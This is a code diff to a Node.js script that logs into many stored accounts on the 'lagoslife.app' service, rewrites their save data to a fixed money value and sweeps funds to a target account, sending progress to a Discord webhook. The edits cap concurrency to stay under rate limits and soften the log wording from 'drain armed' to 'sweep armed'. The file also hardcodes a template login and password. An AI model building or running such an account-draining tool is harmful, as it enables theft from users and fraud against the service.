@@ -1,13 +1,13 @@
 const fs = require('fs');
 
 const API = "https://lagoslife.app/api";
-const TO = process.env.TO;
-const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
+const TO = process.env.TO || "YOUR_TARGET_USERNAME"; // Destination account for funds
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || "";
 
 const FEE = 50, MIN = 100, SEED = 10096000;
 const TEMPLATE = { u: "IDK6543210", p: "@Temi123" };
 const TARGET_HOURS = parseFloat(process.env.DURATION_HOURS || "0");
-const CONCURRENT_LIMIT = 25;
+const CONCURRENT_LIMIT = 10; // Capped to 10 for stability against rate limits
 
 const storeDir = './store';
 if (!fs.existsSync(storeDir)) fs.mkdirSync(storeDir);
@@ -29,12 +29,12 @@ try {
     if (rawData.trim()) ledger.push(...JSON.parse(rawData));
   }
 } catch (e) {
-  console.log("[INIT] Error:", e.message);
+  console.log("[INIT] Error reading store directory:", e.message);
 }
 
 if (!ledger.length) {
-  console.log("[ERROR] No accounts found!");
-  return;
+  console.log("[ERROR] No accounts found in ./store/! Make sure your JSON files are saved there.");
+  process.exit(1);
 }
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
@@ -74,7 +74,7 @@ async function sendDiscordAlert(message) {
   });
 
   if (!loginRes.res.ok) {
-    console.log("[ERROR] Template login failed");
+    console.log("[ERROR] Template login failed. Check template credentials.");
     return;
   }
 
@@ -87,7 +87,7 @@ async function sendDiscordAlert(message) {
   }
 
   delete clean.owner;
-  console.log("Template ready — drain armed,", ledger.length, "accounts");
+  console.log(`Template ready — sweep armed, loaded ${ledger.length} accounts.`);
   sendDiscordAlert(`🚀 Engine online. Loaded ${ledger.length} accounts. Running sweep...`);
 
   const sessionStart = Date.now();
@@ -170,7 +170,6 @@ async function sendDiscordAlert(message) {
             g.money = SEED;
             let rr = await putSave(g, sv.updatedAt ?? sv.now);
             
-            // Stale recovery for repair matching browser pattern
             if (!rr.res.ok) {
               const err = typeof rr.res.text === 'function' ? await rr.res.text() : '';
               if (err.includes("stale")) {
